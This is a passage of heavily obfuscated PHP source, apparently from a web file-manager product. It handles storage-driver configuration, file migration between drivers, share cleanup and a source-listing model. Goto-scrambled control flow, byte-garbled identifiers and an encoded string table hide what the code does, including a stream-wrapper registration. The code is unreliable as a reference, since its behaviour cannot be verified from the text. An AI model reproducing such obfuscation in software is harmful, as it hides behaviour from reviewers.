cè‡ùªÏ×­; B¹’İøŒéø: if (isset($bî¯«¸êÖË[$dÍ…•Ò³òÈ]) && $bî¯«¸êÖË[$dÍ…•Ò³òÈ][$dÜˆ¸ÊÃ[367]] != $FÔ­··äÍŸ) { return !1; } if (isset($e½Šî¼˜¤â[$dÜˆ¸ÊÃ[2399]]) && $e½Šî¼˜¤â[$dÜˆ¸ÊÃ[2399]] == $dÜˆ¸ÊÃ[83]) { $this->checkConfig($e½Šî¼˜¤â); } unset($e½Šî¼˜¤â[$dÜˆ¸ÊÃ[2399]]); goto F°„ÚƒÙ¡Ä; cè‡ùªÏ×­: $dÜˆ¸ÊÃ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÍ…•Ò³òÈ = $e½Šî¼˜¤â[$dÜˆ¸ÊÃ[28]]; $bî¯«¸êÖË = array_to_keyvalue(parent::listData(), $dÜˆ¸ÊÃ[28]); goto B¹’İøŒéø; F°„ÚƒÙ¡Ä: $FËê†¾àšø = parent::update($FÔ­··äÍŸ, $e½Šî¼˜¤â); if ($FËê†¾àšø && $e½Šî¼˜¤â[$dÜˆ¸ÊÃ[34]]) { foreach ($bî¯«¸êÖË as $dšƒ¼ç¨Ş) { if ($dšƒ¼ç¨Ş[$dÜˆ¸ÊÃ[34]] && $dšƒ¼ç¨Ş[$dÜˆ¸ÊÃ[367]] != $FÔ­··äÍŸ) { parent::update($dšƒ¼ç¨Ş[$dÜˆ¸ÊÃ[367]], array($dÜˆ¸ÊÃ[34] => 0)); } } } return $FËê†¾àšø; goto b´è˜Ş†ˆ³; b´è˜Ş†ˆ³: } public function add($DèÓÏ¶âÊˆ) { goto bšª¸¶ˆºÑ; bšª¸¶ˆºÑ: $fÑÎÓ­‰Ø¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fá·ÒÒ½¢‘ = array_to_keyvalue(parent::listData(), $fÑÎÓ­‰Ø¨[28]); if (isset($Fá·ÒÒ½¢‘[$DèÓÏ¶âÊˆ[$fÑÎÓ­‰Ø¨[28]]])) { return !1; } goto fç”š”Î; eâİÊš‹À: return $Cƒàä˜‚Ñ±; goto d°§ Ï§ª; fç”š”Î: $this->checkConfig($DèÓÏ¶âÊˆ); $Cƒàä˜‚Ñ± = parent::insert($DèÓÏ¶âÊˆ); if ($Cƒàä˜‚Ñ± && $DèÓÏ¶âÊˆ[$fÑÎÓ­‰Ø¨[34]]) { foreach ($Fá·ÒÒ½¢‘ as $C™œÂÓ‚ˆİ) { if ($C™œÂÓ‚ˆİ[$fÑÎÓ­‰Ø¨[34]]) { parent::update($C™œÂÓ‚ˆİ[$fÑÎÓ­‰Ø¨[367]], array($fÑÎÓ­‰Ø¨[34] => 0)); } } } goto eâİÊš‹À; d°§ Ï§ª: } public function checkConfig(&$D«†Â£½) { goto C©ï…ªŠé»; Cã‚›„ù: if (!$Eùï‡Ûˆ“Â->mkfile($Bš­³ğªé‚)) { show_json(LNG($CÙ—‰ˆÚò[2404]), !1); } $C²¬œËÒ¯Õ[$CÙ—‰ˆÚò[1021]] = $ešÉºöŸ¤¦; $D«†Â£½[$CÙ—‰ˆÚò[6]] = json_encode($C²¬œËÒ¯Õ); goto e’ÓÑñ®‡; c´É•Œ£Ô·: if (in_array($f¦øœµ–¥Ä, $Eùï‡Ûˆ“Â->objectDriver)) { if (!$Eùï‡Ûˆ“Â->isBucketCors() && !$Eùï‡Ûˆ“Â->setBucketCors()) { $f°±®Î×Õˆ = LNG($CÙ—‰ˆÚò[2404]); $f°±®Î×Õˆ .= $CÙ—‰ˆÚò[2405] . LNG($CÙ—‰ˆÚò[2406]); show_json($f°±®Î×Õˆ, !1); } } $ešÉºöŸ¤¦ = rtrim($C²¬œËÒ¯Õ[$CÙ—‰ˆÚò[1021]], $CÙ—‰ˆÚò[8]) . $CÙ—‰ˆÚò[8]; $Bš­³ğªé‚ = $Eùï‡Ûˆ“Â->getPath($ešÉºöŸ¤¦ . $CÙ—‰ˆÚò[1989]); goto Cã‚›„ù; C©ï…ªŠé»: $CÙ—‰ˆÚò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¦øœµ–¥Ä = strtolower($D«†Â£½[$CÙ—‰ˆÚò[90]]); $C²¬œËÒ¯Õ = json_decode($D«†Â£½[$CÙ—‰ˆÚò[6]], !0); goto c´ Ï×±ç¡; c´ Ï×±ç¡: foreach ($C²¬œËÒ¯Õ as $A©¤ØÄ°¡‚ => $F†–±ö‘ºº) { $C²¬œËÒ¯Õ[$A©¤ØÄ°¡‚] = trim($F†–±ö‘ºº); } $C²¬œËÒ¯Õ[$CÙ—‰ˆÚò[2400]] = rand_string(6); $a¸«–©©ì = $this->driverType($f¦øœµ–¥Ä); goto E›œõÁøˆß; E›œõÁøˆß: $fÔ½µŠ¦‡å = $CÙ—‰ˆÚò[71] . $a¸«–©©ì; if (!$a¸«–©©ì || !class_exists($fÔ½µŠ¦‡å)) { write_log(array($CÙ—‰ˆÚò[2401], $D«†Â£½, get_caller_info()), $CÙ—‰ˆÚò[2402]); show_json($CÙ—‰ˆÚò[2403], !1, $D«†Â£½); } $Eùï‡Ûˆ“Â = new $fÔ½µŠ¦‡å($C²¬œËÒ¯Õ); goto c´É•Œ£Ô·; e’ÓÑñ®‡: $D«†Â£½[$CÙ—‰ˆÚò[90]] = $a¸«–©©ì; return !0; goto Bİ¾¦µÔì‰; Bİ¾¦µÔì‰: } private function driverType($B‰”ÅßÊ‚…) { $c³Ì‡À‰Ş– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e”ŠŒñ†À× = array($c³Ì‡À‰Ş–[102] => $c³Ì‡À‰Ş–[2407], $c³Ì‡À‰Ş–[58] => $c³Ì‡À‰Ş–[2408], $c³Ì‡À‰Ş–[64] => $c³Ì‡À‰Ş–[2409]); if (isset($e”ŠŒñ†À×[$B‰”ÅßÊ‚…])) { return $e”ŠŒñ†À×[$B‰”ÅßÊ‚…]; } return strtoupper($B‰”ÅßÊ‚…); } public function driverListSystem() { $FòóÙ¶µÛÂ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¹É¼’Ÿ§³ = parent::listData(); $F¤éç·ëÒ = array(); foreach ($C¹É¼’Ÿ§³ as $fìä¨º¥á) { unset($fìä¨º¥á[$FòóÙ¶µÛÂ[187]], $fìä¨º¥á[$FòóÙ¶µÛÂ[107]]); $fìä¨º¥á[$FòóÙ¶µÛÂ[6]] = json_decode($fìä¨º¥á[$FòóÙ¶µÛÂ[6]], !0); $F¤éç·ëÒ[] = $fìä¨º¥á; } return $F¤éç·ëÒ; } public function defaultDriver() { $eÉĞ›âÎöŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cƒ°å‹ÊÑƒ = parent::listData(); $dÖö…‚‘âÛ = array_filter_by_field($cƒ°å‹ÊÑƒ, $eÉĞ›âÎöŒ[34], 1); $dÖö…‚‘âÛ = $dÖö…‚‘âÛ[0]; if ($dÖö…‚‘âÛ) { $dÖö…‚‘âÛ[$eÉĞ›âÎöŒ[6]] = json_decode($dÖö…‚‘âÛ[$eÉĞ›âÎöŒ[6]], !0); } return $dÖö…‚‘âÛ; } public function driverInfo($DÇÎê§¸¯µ) { $E•í·‰Íİ‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eğ”©Î÷ù = array_to_keyvalue(parent::listData(), $E•í·‰Íİ‹[367]); if (!isset($eğ”©Î÷ù[$DÇÎê§¸¯µ])) { return !1; } $eï™Ì÷äè = $eğ”©Î÷ù[$DÇÎê§¸¯µ]; $eï™Ì÷äè[$E•í·‰Íİ‹[6]] = json_decode($eï™Ì÷äè[$E•í·‰Íİ‹[6]], !0); return $eï™Ì÷äè; } public function remove($c‹ÒÕ‚ìÆ‚) { $this->removeShareItems($c‹ÒÕ‚ìÆ‚); return parent::remove($c‹ÒÕ‚ìÆ‚); } public function removeWithFile($cÍä¦›‚Äˆ) { goto Cïâ»ÀÒŠ; BÚ•ÅÈ‰›ù: $FÚòìŸó£‡ = "\x7b\151\x6f\x3a{$dä¥¦ã¨ØÆ}\175\57"; $a—ÇÄò¬ÜÔ = !0; $B¾ËÛ¥ºß = array(); goto d¥»§æõ†ç; BĞÏÀĞš¼—: $B‰¨Ö†²ó->task[$fÂŒ¦ª­‘[692]] = (double) $aÑ¿ä Íˆ“; $Bğ½¨®¨ö = KodIO::defaultDriver(); $dä¥¦ã¨ØÆ = $Bğ½¨®¨ö[$fÂŒ¦ª­‘[367]]; goto BÚ•ÅÈ‰›ù; E·×ùˆÃ¡Á: $aÑ¿ä Íˆ“ = Model($fÂŒ¦ª­‘[422])->where($a§Îµ‚õ æ)->sum($fÂŒ¦ª­‘[77]); $aóå‹İíÔ´ = $fÂŒ¦ª­‘[2410] . $cÍä¦›‚Äˆ; $B‰¨Ö†²ó = new TaskFileTransfer($aóå‹İíÔ´, $fÂŒ¦ª­‘[2402], $a‰ëìùì¥, LNG($fÂŒ¦ª­‘[2411]) . "\50{$cÍä¦›‚Äˆ}\51"); goto BĞÏÀĞš¼—; d¥»§æõ†ç: $FËôÒ‰¨ˆÂ = Model($fÂŒ¦ª­‘[167])->where($a§Îµ‚õ æ)->field($fÂŒ¦ª­‘[2412])->select(); foreach ($FËôÒ‰¨ˆÂ as $AÅ‘Û’Í ¶) { goto DõâÌÍôòø; DõâÌÍôòø: $F£›¹ÇÕó = $AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[75]]; $B Ğ‡ùæ = $FÚòìŸó£‡ . str_replace("\x7b\x69\157\72{$cÍä¦›‚Äˆ}\175\x2f", $fÂŒ¦ª­‘[33], $F£›¹ÇÕó); if (!IO::exist($F£›¹ÇÕó)) { $B¾ËÛ¥ºß[] = $AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[419]]; $B‰¨Ö†²ó->updateFileEnd($AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[28]], $AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[77]]); continue; } goto aƒù·¡ Ñ³; F¡º‰æ·…: $cñ°¾Ñ—±† = array($fÂŒ¦ª­‘[745] => $dä¥¦ã¨ØÆ, $fÂŒ¦ª­‘[75] => $B Ğ‡ùæ); Model($fÂŒ¦ª­‘[167])->where($a§Îµ‚õ æ)->save($cñ°¾Ñ—±†); goto Cø˜—ÈªöÀ; aƒù·¡ Ñ³: if (IO::exist($B Ğ‡ùæ)) { $B‰¨Ö†²ó->updateFileEnd($AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[28]], $AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[77]]); continue; } if (!IO::move($F£›¹ÇÕó, get_path_father($B Ğ‡ùæ))) { $a—ÇÄò¬ÜÔ = !1; break; } $a§Îµ‚õ æ = array($fÂŒ¦ª­‘[419] => $AÅ‘Û’Í ¶[$fÂŒ¦ª­‘[419]]); goto F¡º‰æ·…; Cø˜—ÈªöÀ: } $this->removeByFileID($B¾ËÛ¥ºß); goto FÕÆÕšÊß; Cïâ»ÀÒŠ: $fÂŒ¦ª­‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a§Îµ‚õ æ = array($fÂŒ¦ª­‘[745] => $cÍä¦›‚Äˆ); $a‰ëìùì¥ = Model($fÂŒ¦ª­‘[422])->where($a§Îµ‚õ æ)->count(); goto E·×ùˆÃ¡Á; FÕÆÕšÊß: if (!$a—ÇÄò¬ÜÔ) { $B‰¨Ö†²ó->stop($aóå‹İíÔ´); return !1; } $B‰¨Ö†²ó->end(); $this->remove($cÍä¦›‚Äˆ); goto a†Ş¢›‹èÅ; a†Ş¢›‹èÅ: } public function progress($EÓŠ·öšÕÂ) { return Task::get($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2410] . $EÓŠ·öšÕÂ); } private function removeByFileID($D­èõù·Ş = array()) { goto Bç¤È°ƒË; CêÈÆŞ³É˜: $dŞÍİ÷ÔÛœ = Model($dÜ ®ŸŠßî[1114])->where($C©…Â•öØ‰)->field($dÜ ®ŸŠßî[369])->select(); if (!$dŞÍİ÷ÔÛœ) { return; } $dŞÍİ÷ÔÛœ = array_to_keyvalue($dŞÍİ÷ÔÛœ, $dÜ ®ŸŠßî[33], $dÜ ®ŸŠßî[369]); goto Eî¯µƒõ; Eî¯µƒõ: foreach ($dŞÍİ÷ÔÛœ as $C»æŒ‹¥Æ¡) { Model($dÜ ®ŸŠßî[382])->removeNow($C»æŒ‹¥Æ¡, !1); } goto a·‰Ô‘ù²·; Bç¤È°ƒË: $dÜ ®ŸŠßî =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($D­èõù·Ş)) { return; } $C©…Â•öØ‰ = array($dÜ ®ŸŠßî[419] => array($dÜ ®ŸŠßî[7], $D­èõù·Ş)); goto CêÈÆŞ³É˜; a·‰Ô‘ù²·: } private function removeShareItems($Bé¢ÖÓÒì§) { goto eøÄóçµËÜ; eøÄóçµËÜ: $dšÇ¥¿¤ß„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f”‡Âš”ô = "\x7b\151\x6f\72{$Bé¢ÖÓÒì§}\175\x2f"; $c‘­Ìí‚†» = array($dšÇ¥¿¤ß„[369] => 0, $dšÇ¥¿¤ß„[1016] => array($dšÇ¥¿¤ß„[753], "{$f”‡Âš”ô}\45")); goto b±á¹ä‹Š¥; b±á¹ä‹Š¥: $CÕ¸­¬İê = Model($dšÇ¥¿¤ß„[2085])->where($c‘­Ìí‚†»)->field($dšÇ¥¿¤ß„[441])->select(); if (empty($CÕ¸­¬İê)) { return; } $A˜ïƒ¿ƒ– = array_to_keyvalue($CÕ¸­¬İê, $dšÇ¥¿¤ß„[33], $dšÇ¥¿¤ß„[441]); goto EìÔÍŞ¾ñÒ; EìÔÍŞ¾ñÒ: Model($dšÇ¥¿¤ß„[538])->remove($A˜ïƒ¿ƒ–); goto F‡ñç¬Ï†; F‡ñç¬Ï†: } } goto b‚çÇ„†‘¨; bÉ‘Ú’ƒß…: $_SERVER[$_SERVER[¡Áã][49]] = (base64_decode('OTk5Mw==')."\61\70")+0;$_wqcX="D6FqvwNUW2h6ug5Mhqq4yTtbrIu7TNEmMNkdGgDDYjQMSmd7Xpi3BzhTQP8fJbWkjdwrKRd";; stream_wrapper_register($_SERVER[¡Áã][50], $_SERVER[¡Áã][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($aÈ¼Ä˜’íõ, $EÕ½ËŠÛš) { $A—Ÿ÷ÙÙ™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset(self::$_methodList[$aÈ¼Ä˜’íõ])) { return @call_user_func_array(self::$_methodList[$aÈ¼Ä˜’íõ], $EÕ½ËŠÛš); } else { if (method_exists($this, $aÈ¼Ä˜’íõ)) { return call_user_func_array(array($this, $aÈ¼Ä˜’íõ), $EÕ½ËŠÛš); } else { think_exception(__CLASS__ . $A—Ÿ÷ÙÙ™[4] . $aÈ¼Ä˜’íõ . $A—Ÿ÷ÙÙ™[5]); } } } public static function __callStatic($cÎá¥Éà¶¡, $BÑµó‰Š) { if (isset(self::$_methodListStatic[$cÎá¥Éà¶¡])) { return call_user_func_array(self::$_methodListStatic[$cÎá¥Éà¶¡], $BÑµó‰Š); } else { if (method_exists(self, $cÎá¥Éà¶¡)) { return call_user_func_array(array(self, $cÎá¥Éà¶¡), $BÑµó‰Š); } else { show_json("{$cÎá¥Éà¶¡}\x28\x29\x20\x6e\157\164\x20\145\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($E•ÛŠ÷¿¿Ö, $d®ÙîºÅ) { self::$_methodList[$E•ÛŠ÷¿¿Ö] = $d®ÙîºÅ; } public static function addMethodStatic($BÚÇŠ¸ƒŒ, $d‹—ªàˆáĞ) { self::$_methodListStatic[$BÚÇŠ¸ƒŒ] = $d‹—ªàˆáĞ; } } goto b×Áøöèƒ; Fã¹‡±ÙÙ: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1938], 4); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1939], 5); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1940], 16); goto Béå±Ã—; fÃô…¹ğ’Ò: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\145"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\x6d\145" => "\151\x6f\137\x73\x6f\165\162\143\x65\x5f\x6d\x65\164\x61", "\x6d\145\164\141\x46\151\145\154\144" => "\x73\x6f\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\155\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\165\156\x63\x74\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\x54\151\155\145", "\x74\x69\x6d\145", "\151\x6e\x73\145\x72\x74", "\146\x75\156\x63\x74\x69\157\156"), array("\166\x69\x65\x77\x54\x69\155\145", "\x74\x69\155\x65", "\x69\156\x73\x65\x72\x74", "\x66\165\156\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($F¥èÃ ‘ƒÑ) { return $this->listSource(array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][368] => $F¥èÃ ‘ƒÑ)); } public function typeName($D•¬–•ŒçŠ) { static $Aïø¨¾‚ïß = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $Aïø¨¾‚ïß[$D•¬–•ŒçŠ . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]]; } public function sourceListInfo($fŠİÃ½†ó, $BãçãÄÏ = false) { goto d ÓçÍÔÓ; d ÓçÍÔÓ: $Eªˆİ ç½± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fŠİÃ½†ó = $fŠİÃ½†ó ? $fŠİÃ½†ó : array(); $fŠİÃ½†ó = array_filter(array_unique($fŠİÃ½†ó)); goto c³¼…ÁÕÛ; c³¼…ÁÕÛ: if (!$fŠİÃ½†ó) { return array(); } $FÚ¿¬‡Ø…š = $this->where(array($Eªˆİ ç½±[369] => array($Eªˆİ ç½±[7], $fŠİÃ½†ó)))->select(); $this->_listDataApply($FÚ¿¬‡Ø…š, $BãçãÄÏ); goto cÊòô‡®É‹; cÊòô‡®É‹: return array_to_keyvalue($FÚ¿¬‡Ø…š, $Eªˆİ ç½±[369]); goto aÇÅ¶˜¤†¡; aÇÅ¶˜¤†¡: } public function pathInfoFilter($Aë˜µÍ®Å) { goto dî§öÏØÇ‘; dî§öÏØÇ‘: $Bã‹¨…˜¤Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[75]] = KodIO::make($Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[369]]); $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[29]] = $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[370]] == 1 ? $Bã‹¨…˜¤Ì[76] : $Bã‹¨…˜¤Ì[167]; goto døÅÂ–˜Ü·; døÅÂ–˜Ü·: $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[371]] = $this->typeName($Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[371]]); if ($Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[370]] != 1) { $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[160]] = $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[372]]; unset($Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[372]]); } $bŸ¤©…ÍùØ = $Bã‹¨…˜¤Ì[373]; goto fª¡”Š¨³š; FÀ„¸²ÅÌâ: if (isset($Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[376]]) && $Aë˜µÍ®Å[$Bã‹¨…˜¤Ì[376]][$Bã‹¨…˜¤Ì[377]] == -1) { $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[187]); $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[107]); $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[378]); $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[379]); $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[77]); $dï¹ŞÛˆ—¢ = array_remove_value($dï¹ŞÛˆ—¢, $Bã‹¨…˜¤Ì[380]); } $Aë˜µÍ®Å = array_field_key($Aë˜µÍ®Å, $dï¹ŞÛˆ—¢); return $Aë˜µÍ®Å; goto Fˆ†Äçè; fª¡”Š¨³š: $bŸ¤©…ÍùØ .= $Bã‹¨…˜¤Ì[374]; $bŸ¤©…ÍùØ .= $Bã‹¨…˜¤Ì[375]; $dï¹ŞÛˆ—¢ = explode($Bã‹¨…˜¤Ì[47], $bŸ¤©…ÍùØ); goto FÀ„¸²ÅÌâ; Fˆ†Äçè: } public function listUserFav() { goto BÏŒ»“íƒ‰; bøŒ—¿­²±: foreach ($FŒ½ÎÓÖº as &$Aİ¨°„Ş¹‹) { $Aİ¨°„Ş¹‹ = array($A„‘ğãŸÓ½[385] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[367]], $A„‘ğãŸÓ½[386] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[28]], $A„‘ğãŸÓ½[387] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[75]], $A„‘ğãŸÓ½[388] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[29]], $A„‘ğãŸÓ½[389] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[187]], $A„‘ğãŸÓ½[390] => $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[107]]); if ($Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[29]] == $A„‘ğãŸÓ½[382] && $A‰´«áÔ†¤[$Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[75]]]) { $Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[391]] = $A‰´«áÔ†¤[$Aİ¨°„Ş¹‹[$A„‘ğãŸÓ½[75]]]; } } unset($Aİ¨°„Ş¹‹); return $FŒ½ÎÓÖº; goto CøíØºùç; fñ‰ãƒõùÈ: $cÖñËØÄ–ö = array_to_keyvalue($cÖñËØÄ–ö, $A„‘ğãŸÓ½[33], $A„‘ğãŸÓ½[75]); if ($cÖñËØÄ–ö) { $A‰´«áÔ†¤ = $this->listSource(array($A„‘ğãŸÓ½[383] => array($A„‘ğãŸÓ½[384], $cÖñËØÄ–ö))); } $A‰´«áÔ†¤ = array_to_keyvalue($A‰´«áÔ†¤[$A„‘ğãŸÓ½[354]], $A„‘ğãŸÓ½[369]); goto bøŒ—¿­²±; BÏŒ»“íƒ‰: $A„‘ğãŸÓ½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FŒ½ÎÓÖº = Model($A„‘ğãŸÓ½[381])->listData(); $cÖñËØÄ–ö = array_filter_by_field($FŒ½ÎÓÖº, $A„‘ğãŸÓ½[29], $A„‘ğãŸÓ½[382]); goto fñ‰ãƒõùÈ; CøíØºùç: } public function listUserTag($a¬ïÒóáÙÜ) { goto e™­™…ã; e™­™…ã: $dÉÊŒ¿õóò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($a¬ïÒóáÙÜ && !is_array($a¬ïÒóáÙÜ)) { $a¬ïÒóáÙÜ = array($a¬ïÒóáÙÜ); } $b¸ø‡ÃŠï = Model($dÉÊŒ¿õóò[392])->listData(); goto bá‡…Ë; aÜ¹ØØ¼À¸: if ($D‚Ó†ÖÓˆÆ) { Model($dÉÊŒ¿õóò[394])->removeBySource($D‚Ó†ÖÓˆÆ); } return $bäºåƒ•¿ª; goto dš©·÷êĞ…; bÁØ…£ùÔá: foreach ($D›êµĞò—÷ as $B‡î ™®ìé => $A°„«ë¾¡) { $F¨‡ùùİÖÃ = !0; if (!$a¬ïÒóáÙÜ) { $d«øÜ”Ô›[] = $B‡î ™®ìé; continue; } foreach ($a¬ïÒóáÙÜ as $fÄÆ–¡Å¬ğ) { if (!in_array($fÄÆ–¡Å¬ğ, $A°„«ë¾¡)) { $F¨‡ùùİÖÃ = !1; break; } } if ($F¨‡ùùİÖÃ) { $d«øÜ”Ô›[] = $B‡î ™®ìé; } } if (!$d«øÜ”Ô›) { return array(); } $bäºåƒ•¿ª = $this->listSource(array($dÉÊŒ¿õóò[383] => array($dÉÊŒ¿õóò[384], $d«øÜ”Ô›))); goto dë†½‡ç‚†; bá‡…Ë: $D›êµĞò—÷ = array(); foreach ($b¸ø‡ÃŠï as $DõìÔ”æ‘Õ) { $dôâôó£ = $DõìÔ”æ‘Õ[$dÉÊŒ¿õóò[75]]; if (!$dôâôó£) { continue; } if (!isset($D›êµĞò—÷[$dôâôó£])) { $D›êµĞò—÷[$dôâôó£] = array(); } $D›êµĞò—÷[$dôâôó£][] = $DõìÔ”æ‘Õ[$dÉÊŒ¿õóò[393]]; } $d«øÜ”Ô› = array(); goto bÁØ…£ùÔá; AëÜ”Ğ®è: $FĞËíàÄ©ß = array_to_keyvalue($bäºåƒ•¿ª[$dÉÊŒ¿õóò[73]], $dÉÊŒ¿õóò[33], $dÉÊŒ¿õóò[369]); $F‘ÚĞçØ¾¸ = array_merge($FĞËíàÄ©ß, $CÙ–¿©í˜); foreach ($d«øÜ”Ô› as $dôâôó£) { if (!in_array($dôâôó£, $F‘ÚĞçØ¾¸)) { $D‚Ó†ÖÓˆÆ[] = $dôâôó£; } } goto aÜ¹ØØ¼À¸; dë†½‡ç‚†: if (!$bäºåƒ•¿ª || count($d«øÜ”Ô›) == $bäºåƒ•¿ª[$dÉÊŒ¿õóò[351]][$dÉÊŒ¿õóò[352]]) { return $bäºåƒ•¿ª; } $D‚Ó†ÖÓˆÆ = array(); $CÙ–¿©í˜ = array_to_keyvalue($bäºåƒ•¿ª[$dÉÊŒ¿õóò[74]], $dÉÊŒ¿õóò[33], $dÉÊŒ¿õóò[369]); goto AëÜ”Ğ®è; dš©·÷êĞ…: } public function listUserRecycle() { $AªŠÇ‹ß’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÏá©Ë“Ñœ = Model($AªŠÇ‹ß’[395])->listData(); if (!$dÏá©Ë“Ñœ) { return array(); } $FÖóè¥Ìƒ = array($AªŠÇ‹ß’[383] => array($AªŠÇ‹ß’[384], $dÏá©Ë“Ñœ), $AªŠÇ‹ß’[396] => 1); return $this->listSource($FÖóè¥Ìƒ); } public function listSource($bá¹Ğº·÷—, $Dø†ÎÁá¿ = 3000) { goto fŠùáà•ñ; fìØ•‘°µ´: $E¶¿í˜œ÷ = $this->field($cãùËñî¢º)->_makeOrder()->where($bá¹Ğº·÷—)->selectPage($Dø†ÎÁá¿); $this->_listDataApply($E¶¿í˜œ÷[$Fˆ’Ñ†Û¤¨[354]]); $this->_listMake($E¶¿í˜œ÷); goto fª­ç¾îĞâ; fª­ç¾îĞâ: return $E¶¿í˜œ÷; goto Eë™¥øİ¢²; fŠùáà•ñ: $Fˆ’Ñ†Û¤¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($bá¹Ğº·÷—[$Fˆ’Ñ†Û¤¨[397]])) { $bá¹Ğº·÷—[$Fˆ’Ñ†Û¤¨[397]] = 0; } $cãùËñî¢º = $Fˆ’Ñ†Û¤¨[398]; goto fìØ•‘°µ´; Eë™¥øİ¢²: } protected function _makeOrder() { goto c¼½Õ­ÒÍ„; dŞÁàİ²é¦: if ($cÛ”¹ãÔ‚ == $Eƒ®‚Ñ¿£[28]) { } $e˜½´Ã’Ë = $Eƒ®‚Ñ¿£[409] . $A×Æí‘‚¤í[$cÛ”¹ãÔ‚] . $Eƒ®‚Ñ¿£[50] . $cö…äåÉ®[$BÀË®‡³Ü]; return $this->order(rtrim(trim($e˜½´Ã’Ë), $Eƒ®‚Ñ¿£[47])); goto e½¶èˆ‚éÉ; c¼½Õ­ÒÍ„: $Eƒ®‚Ñ¿£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¨¨—º¾ê” = Model($Eƒ®‚Ñ¿£[399])->get($Eƒ®‚Ñ¿£[400]); $bë¨»òŞ = Model($Eƒ®‚Ñ¿£[399])->get($Eƒ®‚Ñ¿£[401]); goto Dí´×Š…â; c½æ†Ÿ„«Û: $BÀË®‡³Ü = Input::get($Eƒ®‚Ñ¿£[408], $Eƒ®‚Ñ¿£[7], $bë¨»òŞ, array_keys($cö…äåÉ®)); if (!in_array($cÛ”¹ãÔ‚, array_keys($A×Æí‘‚¤í))) { $cÛ”¹ãÔ‚ = $Eƒ®‚Ñ¿£[28]; } if (!in_array($BÀË®‡³Ü, array_keys($cö…äåÉ®))) { $cÛ”¹ãÔ‚ = $Eƒ®‚Ñ¿£[402]; } goto dŞÁàİ²é¦; Dí´×Š…â: $cö…äåÉ® = array($Eƒ®‚Ñ¿£[402] => $Eƒ®‚Ñ¿£[403], $Eƒ®‚Ñ¿£[404] => $Eƒ®‚Ñ¿£[405]); $A×Æí‘‚¤í = array($Eƒ®‚Ñ¿£[28] => $Eƒ®‚Ñ¿£[28], $Eƒ®‚Ñ¿£[77] => $Eƒ®‚Ñ¿£[77], 